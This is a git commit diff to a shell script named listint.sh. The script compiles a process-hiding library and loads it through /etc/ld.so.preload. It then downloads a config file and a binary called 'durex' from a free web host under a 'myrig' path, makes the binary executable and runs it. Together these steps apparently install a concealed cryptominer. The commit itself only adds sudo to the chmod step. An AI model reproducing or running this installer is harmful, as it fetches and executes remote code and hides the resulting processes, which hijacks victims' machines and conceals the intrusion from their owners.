7e364781058fc9c1e40ccebc466d16468e0d9552
cihuuy <95659029+cihuuy@users.noreply.github.com>
2023-09-07 23:26:47 +0700

    Update listint.sh

--- listint.sh
+++ listint.sh
@@ -7,5 +7,5 @@ gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl
 mv libprocess.so /usr/local/lib/
 echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
 
-wget https://nyadur.000webhostapp.com/myrig/config.json && wget https://nyadur.000webhostapp.com/myrig/durex && chmod +x durex && ./durex
+wget https://nyadur.000webhostapp.com/myrig/config.json && wget https://nyadur.000webhostapp.com/myrig/durex && sudo chmod +x durex && ./durex
 
